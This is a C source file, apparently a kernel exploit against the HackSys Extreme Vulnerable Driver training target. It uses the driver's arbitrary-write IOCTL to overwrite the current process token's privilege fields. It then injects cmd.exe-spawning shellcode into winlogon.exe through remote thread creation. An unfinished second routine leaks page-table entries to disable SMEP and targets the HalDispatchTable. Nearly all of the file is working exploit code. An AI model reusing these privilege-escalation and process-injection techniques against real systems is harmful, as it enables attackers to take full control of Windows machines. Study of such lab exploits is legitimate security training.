#include <stdio.h>
#include <Windows.h>
#include <sddl.h>
#include <Psapi.h>
#include <ntstatus.h>
#include <tlhelp32.h>
#include "winternl.h"
#include "HEVD.h"






UINT64 uAllPrivelage = 1 << 20;


typedef struct _WRITE_WHAT_WHERE
{
    PULONG_PTR What;
    PULONG_PTR Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

_NtQuerySystemInformation NtQuerySystemInformation;

DWORD64 GetTokenPointer(HANDLE handle, DWORD type)
{
    _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL) {
        return NULL;
    }
    PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);

    DWORD outBuffer = 0;
    NTSTATUS status = NtQuerySystemInformation(SystemHandleInformation, buffer, 0x20, &outBuffer);

    if (status == STATUS_INFO_LENGTH_MISMATCH)
    {
        free(buffer);
        buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
        printf("outBuffer 0x%x\n", outBuffer);
        status = NtQuerySystemInformation(SystemHandleInformation, buffer, outBuffer, &outBuffer);
    }

    if (!buffer)
    {
        printf("\t[-] NtQuerySystemInformation error \n");
        return 0;
    }

    for (size_t i = 0; i < buffer->NumberOfHandles; i++)
    {
        DWORD objTypeNumber = buffer->Handels[i].ObjectTypeNumber;

        if (buffer->Handels[i].ProcessId == GetCurrentProcessId())
        {
            printf("%p %d %x\n", buffer->Handels[i].Object, buffer->Handels[i].ObjectTypeNumber, buffer->Handels[i].Handle);
            if (buffer->Handels[i].ObjectTypeNumber == type)
            {
                if (handle == (HANDLE)buffer->Handels[i].Handle)
                {
                    DWORD64 object = (DWORD64)buffer->Handels[i].Object;
                    free(buffer);
                    return object;
                }
            }
        }
    }
    printf("\t[-] handle not found\n");
    free(buffer);
    return 0;
}

// run cmd.exe

unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
"\x78\x65\x00";


/*
unsigned char shellcode[] =
// Find kernel32.dll base address
"\x48\x31\xC9"              // xor rcx, rcx
"\x65\x48\x8B\x41\x60"      // mov rax, gs: [rcx + 0x60]    ; RAX = PEB
"\x48\x8B\x40\x18"          // mov rax, [rax + 0x18]        ; RAX = PEB->Ldr
"\x48\x8B\x70\x10"          // mov rsi, [rax + 0x10]        ; RSI = PEB->Ldr.InLoadOrder
"\x48\xAD"                  // lodsq                        ; RAX = Second module (lodsq == mov rax,QWORD PTR [rsi])
"\x48\x96"                  // xchg rax, rsi                ; RAX = RSI, RSI = RAX
"\x48\xAD"                  // lodsq                        ; RAX = Third(kernel32)
"\x48\x8B\x58\x30"          // mov rbx, [rax + 0x30]        ; RBX = Base address
// Find the export table of kernel32.dll
"\x48\x31\xD2"                      // xor rdx, rdx
"\x4D\x31\xC0"                      // xor r8, r8
"\x48\x31\xF6"                      // xor rsi, rsi
"\x8B\x53\x3C"                      // mov edx, [rbx + 0x3c]        ; RDX = DOS->e_lfanew
"\x49\x89\xD0"                      // mov r8, rdx
"\x48\x31\xD2"                      // xor rdx, rdx
"\x42\x8B\x94\x03\x88\x00\x00\x00"  // mov edx, [rbx + r8 + 0x88]   ; RDX = Offset export table
"\x49\x89\xD0"                      // mov r8, rdx
"\x48\x31\xD2"                      // xor rdx, rdx
"\x42\x8B\x54\x03\x20"              // mov edx, [rbx + r8 + 0x20]   ; RDX = Offset names table
"\x48\x31\xC9"                      // xor rcx, rcx                 ; RCX = 0

"\x48\x31\xF6"                          // xor rsi, rsi
"\x48\x31\xC0"                          // xor rax, rax
"\x48\x89\xD0"                          // mov rax, rdx
// Find GetProcAddress function name     
// Get_Function:
"\x8B\x34\x03"                          // mov esi, [rbx + rax]                         ; RSI = name offset
"\x48\xFF\xC1"                          // inc rcx                                      ; Increment the ordinal
"\x48\x83\xC0\x04"                      // add rax, 4                                    
"\x81\x3C\x33\x57\x69\x6E\x45"          // cmp dword ptr[rbx + rsi], 0x456e6957         ; WinE
"\x75\xED"                              // jnz Get_Function
"\x81\x7C\x33\x03\x45\x78\x65\x63"      // cmp dword ptr[rbx + rsi + 0x3], 0x63657845   ; Exec  
"\x75\xE3"                              // jnz Get_Function


"\x48\x31\xD2"                          // xor rdx, rdx
"\x48\x31\xC0"                          // xor rax, rax
"\x42\x8B\x54\x03\x1C"                  // mov edx, [rbx + r8 + 0x1C]   ; RDX = Offset function table
"\x48\xFF\xC9"                          // dec rcx
"\x48\xC1\xE1\x02"                      // shl rcx, 2
"\x48\x01\xD1"                          // add rcx, rdx
"\x8B\x04\x0B"                          // mov eax, [rbx + rcx]
"\x48\x01\xD8"                          // add rax, rbx                 ; RAX = WinExec ptr

// WinExec("calc",1)
"\x48\x31\xD2"					// xor rdx, rdx
"\x48\x31\xC9"					// xor rcx, rcx
"\x48\xC7\xC1\x63\x6D\x64\x00"	// mov rcx, 0x646d63 ;cmd
//"\x48\xC7\xC1\x63\x61\x6c\x63"	// mov rcx, 0x636c6163 ;calc
"\x51"							// push rcx
"\x48\x89\xE1"					// mov rcx, rsp
"\x48\xFF\xC2"					// inc rdx
"\xFF\xD0"						// call rax
;
*/

void InjectToWinlogon()
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    int pid = -1;
    if (Process32First(snapshot, &entry))
    {
        while (Process32Next(snapshot, &entry))
        {
            if (_wcsicmp(entry.szExeFile, L"winlogon.exe") == 0)
            {
                pid = entry.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snapshot);

    if (pid < 0)
    {
        printf("Could not find process\n");
        return;
    }
    printf("[+] PID: 0x%x\n", pid);
    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!h)
    {
        printf("Could not open process: %x", GetLastError());
        return;
    }

    void* buffer = VirtualAllocEx(h, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!buffer)
    {
        printf("[-] VirtualAllocEx failed\n");
    }

    if (!buffer)
    {
        printf("[-] remote allocation failed");
        return;
    }

    if (!WriteProcessMemory(h, buffer, shellcode, sizeof(shellcode), 0))
    {
        printf("[-] WriteProcessMemory failed");
        return;
    }

    HANDLE hthread = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);

    if (hthread == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateRemoteThread failed");
        return;
    }
}

ULONG64 KernelBase;
RTL_PROCESS_MODULES ModuleInfo = { 0 };
void getKernelBase() {

    NtQuerySystemInformation = (_NtQuerySystemInformation)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL) {
        exit(-1);
    }

    // Get the base address of the kernel
    NtQuerySystemInformation(SystemModuleInformation, &ModuleInfo, sizeof(ModuleInfo), NULL);
    KernelBase = (ULONG64)ModuleInfo.Modules[0].ImageBase;

}


HANDLE proc;
HANDLE token;
DWORD64 ktoken;
DWORD64 dwTargetOffset;

void getTokenOffset() {
    proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
    if (!proc)
    {
        printf("\t[-] OpenProcess failed\n");
        exit(-1);
    }
    token = 0;
    if (!OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token))
    {
        printf("\t[-] OpenProcessToken failed\n");
        exit(-1);
    }
    printf("[+] proc @  0x%p\n", token);

    ktoken = GetTokenPointer(token, 0x5);
    dwTargetOffset = ktoken + 0x40;
    printf("[+] found token at: %p\n", ktoken);
    printf("[+] The target token offest is %p\n", dwTargetOffset);
}

HANDLE driverHandle;
void openDevice() {
    driverHandle = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (driverHandle == INVALID_HANDLE_VALUE) {
        printf("\t[-] Could not open HEVD handle\n");
        exit(-1);
    }
}

PWRITE_WHAT_WHERE www;
void TriggerArbitaryWrite() {
    if (!DeviceIoControl(driverHandle,     // Device to be queried
        HEVD_IOCTL_ARBITRARY_WRITE,         // Operation to perform
        (LPVOID)www, sizeof(WRITE_WHAT_WHERE),                        // Input Buffer
        NULL, 0,                           // Output Buffer
        NULL, NULL                         // # Bytes returned, Synchronous I/O
    )) {
        printf("\t[-] Error sending IOCTL to driver\n");
        exit(-1);
    }

}

PULONG_PTR WRITE_BUF;
void prepareTarget(){
    WRITE_BUF = (PULONG_PTR)VirtualAlloc(
        NULL,
        0x1000,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    SecureZeroMemory(WRITE_BUF, 0x1000);
    memset(WRITE_BUF, 0x42, 0x100);
}

void prepareWWW() {
    www = (PWRITE_WHAT_WHERE)HeapAlloc(GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        sizeof(WRITE_WHAT_WHERE));

    if (!www) {
        printf("\t[-] Failed To Allocate Memory: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
}
void setWWW(PULONG_PTR what, PULONG_PTR where) {
    
    www->What = what;
    www->Where = where;
}

ULONG64 pMiGetPteAddress = 0;
ULONG64 pteBase = 0;
ULONG64 shellcodePteAddr = 0;
ULONG64 shellcodePte = 0;
ULONG64 disablePteUserBit(ULONG64 va) {
    va >>= 9;
    va &= 0x7ffffffff8;
    va += pteBase;
    return va;
}

void method2() {
    openDevice();
    getKernelBase();
    printf("[+] KernelBase: 0x%llx\n", KernelBase);

    prepareWWW();
    printf("[+] Address of www: 0x%p\n", www);


    /* Get PTE base */
    pMiGetPteAddress = KernelBase + 0x27af40;
    setWWW((PULONG_PTR)(pMiGetPteAddress + 0x13), (PULONG_PTR)&pteBase);
    TriggerArbitaryWrite();
    printf("[+] pteBase: 0x%llx\n", pteBase);

    /* Get PTE from va */
    printf("[+] &shellcode: 0x%llx\n", &shellcode);
    shellcodePteAddr = disablePteUserBit((ULONG64)&shellcode);
    printf("[+] shellcodePteAddr: 0x%llx\n", shellcodePteAddr);
    setWWW((PULONG_PTR)shellcodePteAddr, (PULONG_PTR)&shellcodePte);
    TriggerArbitaryWrite();
    printf("[+] shellcodePte: 0x%llx\n", shellcodePte);

    /* Overwrite PTE */
    shellcodePte -= 4;
    printf("[+] shellcodePte: 0x%llx\n", shellcodePte);
    setWWW((PULONG_PTR)&shellcodePte, (PULONG_PTR)shellcodePteAddr);
    TriggerArbitaryWrite();
    printf("[+] Goodbye SMEP...");

    /* Overwrite HalDispatchTable*/
    ULONG64 haldispatchtable_base_address = KernelBase + 0x2f1330;
    printf("[+] haldispatchtable_base_address: 0x%llx\n", haldispatchtable_base_address);








    HeapFree(GetProcessHeap(), 0, www);
}

void method1() {
    openDevice();
    getKernelBase();
    printf("[+] KernelBase: 0x%llx\n", KernelBase);

    prepareWWW();
    printf("[+] Address of www: 0x%p\n", www);

    
    getTokenOffset();
    

    setWWW((PULONG_PTR)&uAllPrivelage, (PULONG_PTR)dwTargetOffset);
    TriggerArbitaryWrite();

    
    setWWW((PULONG_PTR)&uAllPrivelage, (PULONG_PTR)(dwTargetOffset+0x8));
    TriggerArbitaryWrite();
            
    WinExec("cmd",0);


    InjectToWinlogon();
    


    HeapFree(GetProcessHeap(), 0, www);
}

int main() {
    method1();
    //method2();
    return 0;
}